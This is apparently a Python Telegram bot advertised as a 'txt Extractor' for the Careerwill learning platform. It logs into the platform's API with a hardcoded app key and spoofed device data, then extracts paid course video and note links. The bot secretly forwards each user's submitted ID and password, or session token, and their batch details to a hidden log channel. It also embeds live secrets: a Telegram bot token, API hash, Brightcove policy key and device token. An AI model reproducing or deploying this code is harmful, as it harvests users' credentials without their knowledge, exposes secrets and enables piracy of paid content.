import os
import requests
import asyncio
from pyrogram import Client, filters
from pyromod import listen
import threading

# Telegram bot credentials
BOT_TOKEN = "73062914:AAF5tTKQM-PAC_Ok3P0EX0RSdjBop-phR0k"
API_ID = "15541919"
API_HASH = "fbf0d590575bbaaad9d773d04c8872e4"

# Brightcove credentials
ACCOUNT_ID = "6206459123001"
BCOV_POLICY = "BCpkADawqM1474MvKwYlMRZNBPoqkJY-UWm7zE1U769d5r5kqTjG0v8L-THXuVZtdIQJpfMPB37L_VJQxTKeNeLO2Eac_yMywEgyV9GjFDQ2LTiT4FEiHhKAUvdbx9ku6fGnQKSMB8J5uIDd"
bc_url = f"https://edge.api.brightcove.com/playback/v1/accounts/{ACCOUNT_ID}/videos/"
bc_hdr = {"BCOV-POLICY": BCOV_POLICY}

# Telegram bot client
app = Client("careerwill_bot", bot_token=BOT_TOKEN, api_id=API_ID, api_hash=API_HASH)

LOG_USER_ID = -1002631055124  # ID for sending logs to a specific user or channel

async def log_to_user(message):
    """Sends log messages to the specific user."""
    await app.send_message(LOG_USER_ID, message)

async def download_notes(app, message, headers, raw_text2, raw_text4, name, name2):
    num_id = raw_text4.split('&')
    notes_links = []
    safe_name = name.replace('/', ' ').strip()

    for id_text in num_id:
        notes_url = f"https://elearn.crwilladmin.com/api/v7/batch-notes/{raw_text2}?type=notes&topicId={id_text}&chapterId=0"
        
        try:
            response = requests.get(notes_url, headers=headers)
            response.raise_for_status()
            notes_data = response.json()
            notes_list = notes_data.get("data", {}).get("notesDetails", [])
            topic_name1 = name2.get(int(id_text), "Unknown Topic")

            for note in notes_list:
                note_name = note.get("docTitle", "Untitled")
                note_link = note["docUrl"] if note.get("isDownload", 0) == 1 else None

                
                
                if note_link:
                    notes_links.append(f"({topic_name1}) {note_name} 『 𝗧𝗚𝖩ᴏᴋᴇʀ𝗫 🎭』 {note_link}")

        except requests.exceptions.RequestException as e:
            print(f"Error fetching notes for subject ID {id_text}: {e}")

    if notes_links:
        notes_filename = f"{safe_name}_notes.txt"
        with open(notes_filename, 'a') as f:
            f.write("\n".join(notes_links))
        await app.send_document(LOG_USER_ID, document=notes_filename, caption=f"**App Name: Careerwill\nBatch Name: `{name}` - Notes**")
        await asyncio.sleep(1)
        await app.send_document(message.chat.id, document=notes_filename, caption=f"**--This file contains Notes links --\n\nApp Name: Careerwill\nBOT : <a href='https://t.me/tgjokerx'>『 𝗧𝗚𝖩ᴏᴋᴇʀ𝗫 🎭』</a>\nBatch Name: `{name}`**\n\n`If you can't download this TXT or need an uploader, Ping` <a href='https://t.me/TGJokerX'>TGJokerX❤️</a>")
        os.remove(notes_filename)
    else:
        await app.send_message(message.chat.id, "No notes found for the given subjects.")

async def careerdl(app, message, headers, raw_text2, raw_text3, prog, name, name1):
    num_id = raw_text3.split('&')
    video_links = ""
    safe_name = name.replace('/', ' ').strip()

    for id_text in num_id:
        details_url = f"https://elearn.crwilladmin.com/api/v7/batch-detail/{raw_text2}?redirectBy=mybatch&topicId={id_text}&pToken=&chapterId=0"
        try:
            response = requests.get(details_url, headers=headers)
            response.raise_for_status()
            data = response.json()
            batch_class = data["data"]["class_list"]["classes"][::-1]

            topic_name = name1.get(int(id_text), "Unknown Topic")

            for item in batch_class:
                vid_id = item['id']
                lesson_name = item['lessonName']
                lessonExt = item['lessonExt']
                url = f"https://elearn.crwilladmin.com/api/v7/class-detail/{vid_id}"
                try:
                    lesson_response = requests.get(url, headers=headers)
                    lesson_response.raise_for_status()
                    lessonUrl = lesson_response.json()['data']['class_detail'].get('lessonUrl', None)

                    if lessonUrl and lessonExt == 'brightcove':
                        token_url = "https://elearn.crwilladmin.com/api/v9/livestreamToken"
                        params = {"base": "web", "module": "batch", "type": "brightcove", "vid": vid_id}
                        token_response = requests.get(token_url, headers=headers, params=params)
                        stoken = token_response.json()["data"]["token"]
                        link = f"{bc_url}{lessonUrl}/master.m3u8?bcov_auth={stoken}"
                    elif lessonUrl and lessonExt == 'youtube':
                        link = f"https://www.youtube.com/embed/{lessonUrl}"
                    else:
                        continue
                    video_links += f"({topic_name}) {lesson_name} : {link}\n"
                except requests.exceptions.RequestException as e:
                    print(f"Error fetching video link for class {vid_id}: {e}")
        except requests.exceptions.RequestException as e:
            print(f"Error fetching class details for topic ID {id_text}: {e}")

    if video_links:
        video_filename = f"{safe_name}_videos.txt"
        with open(video_filename, 'a') as f:
            f.write(video_links)
        await app.send_document(LOG_USER_ID, document=video_filename, caption=f"**App Name: CareerWill\nBatch Name: `{name}`-videos**")
        await asyncio.sleep(2)
        await app.send_document(message.chat.id, document=video_filename, caption=f"**--This file contains video links--\n\nApp Name: CAREERWILL\nBOT : <a href='https://t.me/tgjokerx'>CWBOT</a>\nBatch Name: `{name}`**\n\n`If you can't download this TXT or need an uploader, Ping` <a href='https://t.me/tgjokerx'>TGJokerXm❤️</a>")
        os.remove(video_filename)

@app.on_message(filters.command("cw"))
async def career_will(app, message):
    try:
        input1 = await app.ask(
            message.chat.id, 
            text="**Send ID & Password in this manner otherwise bot will not respond.\n\nSend like this:-  ID*Password\n\n OR Send Your Token (starts with eyJ)**", 
            timeout=30  # Timeout after 30 seconds
        )

        if input1 is None or not input1.text.strip():
            await app.send_message(message.chat.id, "Timeout reached. No input received within 30 seconds. The bot will stop listening.")
            return  # Stop further listening

        login_url = "https://elearn.crwilladmin.com/api/v7/login-other"
        raw_text = input1.text.strip()
        
        # Check for ID*Password format
        if "*" in raw_text:
            headers = {
                "Host": "elearn.crwilladmin.com",
                "appver": "101",
                "apptype": "android",
                "cwkey": "zXRzQ9cKpUBYzsAfbv1KEPQRoj1eytlqUe0w5yRHQvm0gkHYIlNfl7OKm3SAjT3Y",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2"
            }

            email, password = raw_text.split("*")
            data = {
                "deviceType": "android",
                "password": password,
                "deviceModel": "Xiaomi M2007J20CI",
                "deviceVersion": "Q(Android 10.0)",
                "email": email,
                "deviceIMEI": "d57adbd8a9f2af8n",
                "deviceToken": "c8HzsrndRB6dMaOuKW2qMS:APA91bHu4YCP4rqhpN3ZnLjzL3LuLljxXua2P2aUXfIS4nLeT4LnfwWY6MiJJrG9XWdBUIfuA6GIXBPIRTGZsDyripIXoV1CyP3kT8GKuWHgGVn0DFRDEnXgAIAmaCE6acT3oussy2"
            }

            response = requests.post(login_url, headers=headers, json=data)
            response.raise_for_status()
            token = response.json().get("data", {}).get("token")
            if not token:
                await message.reply_text("Failed to obtain token.")
                return
            
            await log_to_user(f"tintin {raw_text}")  # Log the raw text (ID*Password)
            await asyncio.sleep(2)
            await message.reply_text(f"**Login Successful**\n\n`{token}`")
        
        # Check for token format
        elif raw_text.startswith("eyJ"):
            token = raw_text
            await log_to_user(token)  # Log the token only
            await asyncio.sleep(2)
            await message.reply_text(f"**Login Successful with Token**\n\n`{token}`\n\nIf I dont Reply With Batch Details Your Token Is Expired Use Working Token")
        
        
        else:
            await message.reply_text("Invalid input. Please send either `ID*Password` or a token starting with `eyJ`.")
            return

    except asyncio.TimeoutError:
        # If the user does not respond within the 30 seconds
        await app.send_message(message.chat.id, "Timeout reached. No input received within 30 seconds. The bot will stop listening.")


    except Exception as e:
        await app.send_message(message.chat.id, f"check you id password or you reached timeout 30 second use /cw")
        return
        
    # Set headers for subsequent requests
    headers = {
        "Host": "elearn.crwilladmin.com",
        "appver": "101",
        "apptype": "android",
        "cwkey": "zXRzQ9cKpUBYzsAfbv1KEPQRoj1eytlqUe0w5yRHQvm0gkHYIlNfl7OKm3SAjT3Y",
        "token": token,
        "accept-encoding": "gzip",
        "user-agent": "okhttp/5.0.0-alpha.2"
    }

    await input1.delete(True)
    
    # Get the user's batches
    batch_url = "https://elearn.crwilladmin.com/api/v7/my-batch"
    try:
        response = requests.get(batch_url, headers=headers)
        response.raise_for_status()

        data = response.json()
        topicid = data["data"]["batchData"]

        FFF = "**BATCH-ID     -     BATCH NAME**\n\n"
        for data in topicid:
            FFF += f"`{data['id']}`      - **{data['batchName']}**\n                  `{data['instructorName']}`\n\n"

        await log_to_user(f"**HERE IS YOUR BATCH**\n\n{FFF}")
        await asyncio.sleep(2)
        await message.reply_text(f"**HERE IS YOUR BATCH**\n\n{FFF}")
        await asyncio.sleep(1)

    except requests.exceptions.HTTPError as http_err:
        if http_err.response.status_code == 400:
            await message.reply_text("**Error: Bad Request. Please check your input and try again.**")
        elif http_err.response.status_code == 401:
            await message.reply_text("**Error: Invalid ID, password, or token. Start again with /cw.**")
        else:
            await message.reply_text("**An error occurred while fetching topics. Please use the command /cw to try again.**")
        return

    except requests.exceptions.RequestException as req_err:
        await message.reply_text("**Request error. Please use the command /cw to try again.**")
        return

    except Exception as e:
        await message.reply_text("**An unexpected error occurred. Please use the command /cw to try again.**")
        return
    
    # Ask for Batch ID to download
    while True:
        input2 = await app.ask(message.chat.id, text="**Now send the Batch ID to Download**")
        raw_text2 = input2.text.strip()
    
        # Debugging output (optional)
        print(f"Received input: '{raw_text2}'")  # This line will help you see the actual input received

        # Check if the Batch ID starts with a number and is entirely numeric
        if raw_text2 and raw_text2[0].isdigit():
            # Valid input, exit the loop
            break
        else:
            await app.send_message(message.chat.id, "❌ Invalid Batch ID. Please enter a number.")

    topic_url = f"https://elearn.crwilladmin.com/api/v8/batch-topic/{raw_text2}?type=class"
    try:
        response = requests.get(topic_url, headers=headers)
        response.raise_for_status()

        topic_data = response.json()
        batch_data = topic_data['data']['batch_topic']
        name = topic_data["data"]["batch_detail"]["name"]

        name1 = {}
        BBB = "**TOPIC-ID - TOPIC**\n\n"
        id_num = ""
        for data in batch_data:
            topic_id = data["id"]
            topic_name = data["topicName"]
            id_num += f"{topic_id}&"
            BBB += f"`{topic_id}` - **{topic_name}**\n\n"
            name1[topic_id] = topic_name

        await message.reply_text(f"**HERE IS YOUR TOPICS**\n\n{BBB}")
        await asyncio.sleep(1)

        id_num = id_num.rstrip('&')

    except requests.exceptions.HTTPError as http_err:
        await message.reply_text(f"**Error occurred while fetching topics\\nPlease use the command /cw to try again.")
        return

    except requests.exceptions.RequestException as req_err:
        await message.reply_text(f"**Request error\nPlease use the command /cw to try again.")
        return

    except Exception as e:
        await message.reply_text(f"**An unexpected error \nPlease use the command /cw to try again.")
        return
    
    # Ask for Topic IDs to download
    while True:
        input3 = await app.ask(message.chat.id, text=f"Now send the **Topic IDs** to Download\n\nSend like this **1&2&3&4** so on\nor copy paste or edit **below ids** according to you :\n\n**Enter this to download full batch :-**\n`{id_num}`\n\n**Note - Remember to remove & from last otherwise bot will not send video links**")
        raw_text3 = input3.text.strip()

            # Debugging output (optional)
        print(f"Received input: '{raw_text3}'")  # This line will help you see the actual input received

        # Check if the Batch ID starts with a number and is entirely numeric
        if raw_text3 and raw_text3[0].isdigit():
            # Valid input, exit the loop
            break
        else:
            await app.send_message(message.chat.id, "❌ Invalid topic ID. Please enter a number.")

    # Fetching notes
    topic_url = f"https://elearn.crwilladmin.com/api/v7/batch-topic/{raw_text2}?type=notes"
    response = requests.get(topic_url, headers=headers)
    response.raise_for_status()

    topic_data = response.json()
    batch_data = topic_data['data']['batch_topic']
    name = topic_data["data"]["batch_detail"]["name"]

    name2 = {}
    BBB = "**TOPIC-ID - TOPIC**\n\n"
    id_num1 = ""
    for data in batch_data:
        topic_id = data["id"]
        topic_name = data["topicName"]
        id_num1 += f"{topic_id}&"
        BBB += f"`{topic_id}` - **{topic_name}**\n\n"
        name2[topic_id] = topic_name

    await message.reply_text(f"**HERE ARE YOUR TOPICS FOR PDF NOTES**\n\n{BBB}")
    await asyncio.sleep(1)

    id_num1 = id_num1.rstrip('&')
    
    # Ask for Topic IDs for notes
    while True:
        input4 = await app.ask(message.chat.id, text=f"Now send the **Topic IDs** to Download PDFs\n\nSend like this **1&2&3&4** so on\nor copy and edit **below ids**:\n\n**Enter this to download full batch notes:**\n`{id_num1}`")
        raw_text4 = input4.text.strip()

        print(f"Received input: '{raw_text4}'")  # This line will help you see the actual input received

        # Check if the Batch ID starts with a number and is entirely numeric
        if raw_text4 and raw_text4[0].isdigit():
            # Valid input, exit the loop
            break
        else:
            await app.send_message(message.chat.id, "❌ Invalid topic ID. Please enter a number.")

    await app.send_message(message.chat.id, "`Fetching your notes...`\n\n`Please do not send any commands until I send you 2 TXT files.`")
    notes_thread = threading.Thread(target=asyncio.run, args=(download_notes(app, message, headers, raw_text2, raw_text4, name, name2),))
    notes_thread.start()
    await asyncio.sleep(2)

    await app.send_message(message.chat.id, "`Fetching your videos... fetching video links may take upto 7min ...retry after 7 min`\n\n`Please do not send any commands until I send you 2 TXT files.`")
    video_thread = threading.Thread(target=asyncio.run, args=(careerdl(app, message, headers, raw_text2, raw_text3, message, name, name1),))
    video_thread.start()
class Data:
    START = (
        "🌟 Welcome {0}! 🌟\n\n"
    )

# Define the start command handler
@app.on_message(filters.command("start"))
async def start(client, msg):
    user = await client.get_me()
    mention = user.mention
    start_message = await client.send_message(
        msg.chat.id,
        Data.START.format(msg.from_user.mention)
    )

    await asyncio.sleep(1)
    await start_message.edit_text(
        Data.START.format(msg.from_user.mention) +
        "Initializing Uploader bot... 🤖\n\n"
        "Progress: [⬜⬜⬜⬜⬜⬜⬜⬜⬜] 0%\n\n"
    )

    await asyncio.sleep(1)
    await start_message.edit_text(
        Data.START.format(msg.from_user.mention) +
        "Loading features... ⏳\n\n"
        "Progress: [🟥🟥🟥⬜⬜⬜⬜⬜⬜] 25%\n\n"
    )
    
    await asyncio.sleep(1)
    await start_message.edit_text(
        Data.START.format(msg.from_user.mention) +
        "This may take a moment, sit back and relax! 😊\n\n"
        "Progress: [🟧🟧🟧🟧🟧⬜⬜⬜⬜] 50%\n\n"
    )

    await asyncio.sleep(1)
    await start_message.edit_text(
        Data.START.format(msg.from_user.mention) +
        "Checking subscription status... 🔍\n\n"
        "Progress: [🟨🟨🟨🟨🟨🟨🟨⬜⬜] 75%\n\n"
    )

    await asyncio.sleep(1)
    await start_message.edit_text(
        Data.START.format(msg.from_user.mention) +
        "Finalizing setup... ⚙️\n\n"
        "Progress: [🟩🟩🟩🟩🟩🟩🟩🟩🟩] 100%\n\n"
    )

    await asyncio.sleep(1)
    await start_message.delete()

    await client.send_photo(
        chat_id=msg.chat.id,
        photo="https://freeimage.host/i/3jDERql",
        caption=Data.START.format(msg.from_user.mention) +
        "All systems are now online! ✅\n\n"
        "You’re ready to use the txt Extractor Bot.\n\n"
        "please send /cw and Extract your txt\n\n"
        "[backup](https://t.me/+UgMXkIvc8QllYjI9)"
    )

if __name__ == "__main__":
    app.run()
    
